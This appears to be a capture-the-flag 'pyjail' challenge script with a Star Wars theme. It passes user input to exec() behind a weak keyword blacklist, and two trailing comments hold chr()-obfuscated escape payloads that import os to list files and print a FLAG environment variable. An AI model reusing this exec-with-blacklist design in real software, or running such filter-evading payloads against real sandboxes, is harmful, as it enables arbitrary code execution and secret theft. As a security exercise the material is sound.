#!/usr/bin/python3
import time, sys

def greeting():
    time.sleep(0.1)

    print("You rebel scum won't escape my inescapable fortress. My magnificent fortress!")

    time.sleep(0.5)

    print("\nDon't you even dare use your filthy Jedi mind tricks! They have no power here!\n")

    time.sleep(0.5)

    with open("darth-vader_ascii-art.txt", "r", encoding="utf-8") as art:
        for line in art:
            line = line.replace('\n', '')
            print(line)
            time.sleep(0.1)

def sandbox():
    while True:
        try:
            code = input(">>> ")

            dangerous_patterns = [
                "exec",
                "eval",
                "__import__",
                "import",
                "open",
                "compile"
            ]

            code = code.replace('"', '').replace("'", "").replace("_", "")

            hit = next((kw for kw in dangerous_patterns if kw in code), None)
            if hit:
                print(f"You're dead, rebel! {hit} is not allowed here!")
                print(code)
                continue
            
            exec(code)

        except Exception as e:
            print(code)
            print("Error occurred! See you, rebel!")
            print(e)

if __name__ == "__main__":
    greeting()
    sandbox()

# list working directory
# g=globals();a=chr(95)*2+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)*2;b=g[a];p=getattr(b,chr(95)*2+chr(100)+chr(105)+chr(99)+chr(116)+chr(95)*2,b);c=p[chr(95)*2+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)*2];os=c(chr(111)+chr(115));print(os.listdir(chr(46)))

# read flag ENV
# g=globals();a=chr(95)*2+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)*2;b=g[a];p=getattr(b,chr(95)*2+chr(100)+chr(105)+chr(99)+chr(116)+chr(95)*2,b);c=p[chr(95)*2+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)*2];os=c(chr(111)+chr(115));print(os.system(chr(101)+chr(99)+chr(104)+chr(111)+chr(32)+os.environ[chr(70)+chr(76)+chr(65)+chr(71)]))